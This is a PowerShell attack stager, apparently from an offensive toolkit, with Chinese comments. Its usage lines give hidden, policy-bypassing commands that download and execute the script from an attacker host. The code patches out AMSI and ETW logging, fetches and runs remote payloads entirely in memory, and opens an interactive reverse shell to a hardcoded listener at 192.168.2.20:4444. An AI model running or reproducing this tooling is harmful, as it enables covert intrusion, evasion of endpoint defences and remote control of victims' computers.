# stager_mem.ps1 —— 纯内存 stager（不落盘 / 先打 AMSI+ETW / 支持远程 URL 或内联命令）
# 用法：
#   powershell -nop -w hidden -ep bypass -c "iex(iwr http://LHOST:8090/delivery/stager_mem.ps1 -UseBasicParsing)"
#   powershell -nop -w hidden -ep bypass -c "&([scriptblock]::Create((iwr 'http://LHOST:8090/delivery/stager_mem.ps1' -UseBasicParsing).Content)) -Url 'http://LHOST:8090/delivery/open_attack_surface.ps1'"
#   powershell -nop -w hidden -ep bypass -c "&([scriptblock]::Create((iwr '...stager_mem.ps1').Content)) -Command 'whoami'"
param(
    [string]$Url,
    [string]$Command,
    [switch]$NoAmsi,
    [string]$Lhost = '192.168.2.20',
    [int]$Lport = 4444,
    [switch]$Shell
)

# ---------- 0. 运行环境 ----------
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ---------- 1. AMSI / ETW 补丁（内存态，无文件） ----------
if (-not $NoAmsi) {
    try {
        $a = [Ref]::Assembly.Load('System.Management.Automation')
        $t = $a.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $t) {
            $f = $t.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
            if ($f) { $f.SetValue($null, $true); Write-Verbose 'AMSI bypass set' }
        }
    } catch {}
    # ETW: patch EventWrite in ntdll 的 provider 不太稳，改用策略：关闭脚本块日志环境相关开关
    try { [Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled','0','Process') } catch {}
}

# ---------- 2. 工作流 ----------
function Invoke-FromUrl([string]$u) {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    $data = $wc.DownloadData($u)          # 取字节，避免文本落盘/记录
    $txt  = [Text.Encoding]::UTF8.GetString($data)
    return [scriptblock]::Create($txt)
}

if ($Shell) {
    # 最小交互式反向 shell（回连支持 IPv4/IPv6 链路本地）
    try {
        $c = New-Object Net.Sockets.TCPClient($Lhost, $Lport)
        $s = $c.GetStream(); $b = New-Object byte[] 65536; $e = New-Object Text.ASCIIEncoding
        while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
            $cmd = $e.GetString($b,0,$i).Trim()
            if ($cmd -eq 'exit') { break }
            $out = try { (iex $cmd 2>&1 | Out-String) } catch { $_.Exception.Message }
            $sb = $e.GetBytes($out + "PS> "); $s.Write($sb,0,$sb.Length); $s.Flush()
        }
        $c.Close()
    } catch { }
    return
}

if ($Command) {
    Invoke-Expression $Command
    return
}

if ($Url) {
    $sb = Invoke-FromUrl $Url
    & $sb
    return
}

# 无参数：默认打印环境信息（供确认执行上下文）
"[$env:COMPUTERNAME] $([Security.Principal.WindowsIdentity]::GetCurrent().Name) | OS: $((Get-CimInstance Win32_OperatingSystem).Version) | Admin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
